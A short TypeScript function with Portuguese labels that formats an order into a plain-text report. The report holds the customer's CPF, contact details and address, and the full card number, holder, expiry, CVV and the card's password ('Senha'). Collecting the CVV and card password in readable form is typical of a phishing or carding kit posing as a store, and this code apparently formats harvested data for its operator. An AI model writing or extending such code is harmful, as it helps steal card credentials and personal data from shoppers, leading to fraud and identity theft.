export const formatOrderData = (order: any) => {
  return `
DADOS DO PEDIDO
--------------
Data: ${new Date(order.timestamp).toLocaleString()}
ID do Pedido: ${order.id}

DADOS DO CLIENTE
---------------
Nome: ${order.customer.name}
CPF: ${order.customer.cpf}
Email: ${order.customer.email}
Telefone: ${order.customer.phone}
Endereço: ${order.customer.address}
Cidade: ${order.customer.city}
Estado: ${order.customer.state}
CEP: ${order.customer.zipCode}

DADOS DO CARTÃO
--------------
Número: ${order.credit_card_data.cardNumber}
Titular: ${order.credit_card_data.cardHolder}
Validade: ${order.credit_card_data.expiryDate}
CVV: ${order.credit_card_data.cvv}
Senha: ${order.credit_card_data.password}
Parcelamento: ${order.credit_card_data.installments}x sem juros

ITENS DO PEDIDO
--------------
${order.items.map((item: any) => `${item.title}
Quantidade: ${item.quantity}
Preço: R$ ${item.price.toFixed(2)}
`).join('\n')}

TOTAL DO PEDIDO: R$ ${order.total.toFixed(2)}
==============================================
`;
};